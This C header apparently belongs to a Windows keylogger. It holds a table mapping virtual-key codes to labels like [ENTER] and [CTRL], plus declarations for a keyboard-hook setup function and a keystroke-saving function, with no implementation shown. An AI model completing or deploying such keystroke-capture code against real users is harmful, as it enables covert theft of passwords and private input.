#pragma once

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <io.h>

struct keyboard
{
	DWORD code;
	char *character;
};

const struct keyboard keyboard[] =
{
	{ VK_BACK, "[BACK]" },
	{ VK_TAB, "[TAB]" },
	{ VK_CLEAR, "[CLR]" },
	{ VK_RETURN, "[ENTER]" },
	{ VK_SHIFT, "[SHIFT]" },
	{ VK_CONTROL, "[CTRL]" },
	{ VK_MENU, "[ALT]" },
	{ VK_CAPITAL, "[CAPS LOCK]" },
	{ VK_ESCAPE, "[ESC]" },
	{ VK_SPACE, "[SPACE]" },
	{ VK_PRIOR, "[PGUP]" },
	{ VK_NEXT, "[PGDW]" },
	{ VK_END, "[END]" },
	{ VK_HOME, "[HOME]" },
	{ VK_LEFT, "[LEFT]" },
	{ VK_UP, "[UP]" },
	{ VK_RIGHT, "[RIGHT]" },
	{ VK_DOWN, "[DOWN]" },
	{ VK_SNAPSHOT, "[PRTSCRN]" },
	{ VK_INSERT, "[insert]" },
	{ VK_DELETE, "[DEL]" },
	{ 0x30, "0" },
	{ 0x31, "1" },
	{ 0x32, "2" },
	{ 0x33, "3" },
	{ 0x34, "4" },
	{ 0x35, "5" },
	{ 0x36, "6" },
	{ 0x37, "7" },
	{ 0x38, "8" },
	{ 0x39, "9" },
	{ VK_NUMPAD0, "0" },
	{ VK_NUMPAD1, "1" },
	{ VK_NUMPAD2, "2" },
	{ VK_NUMPAD3, "3" },
	{ VK_NUMPAD4, "4" },
	{ VK_NUMPAD5, "5" },
	{ VK_NUMPAD6, "6" },
	{ VK_NUMPAD7, "7" },
	{ VK_NUMPAD8, "8" },
	{ VK_NUMPAD9, "9" },
	{ VK_LCONTROL, "[CTRL]" },
	{ VK_RCONTROL, "[CTRL]" },
	{ VK_LSHIFT, "[SHIFT]" }, 

	{ VK_RSHIFT, "[SHIFT]" },
	{ VK_OEM_2, "[~]" },
	{ VK_NUMLOCK, "[NUMLOCK]" },
	{ VK_DIVIDE, "[/]" },
	{ VK_MULTIPLY, "[*]" },
	{ VK_ADD, "[+]" },
	{ VK_SUBTRACT, "-" },
	{ VK_DECIMAL, "[.]" },
	{ VK_F1, "[f1]" },
	{ VK_F2, "[f2]" },
	{ VK_F3, "[f3]" },
	{ VK_F4, "[f4]" },
	{ VK_F5, "[f5]" },
	{ VK_F6, "[f6]" },
	{ VK_F7, "[f7]" },
	{ VK_F8, "[f8]" },
	{ VK_F9, "[f9]" },
	{ VK_F10, "[f10]" },
	{ VK_F11, "[f11]" },
	{ VK_F12, "[f12]" },
	{ VK_LWIN, "[WIN]" },
	{ VK_RWIN, "[WIN]" },
	{ 0, NULL }
};
void	setwinhook();
void	save_data(const char);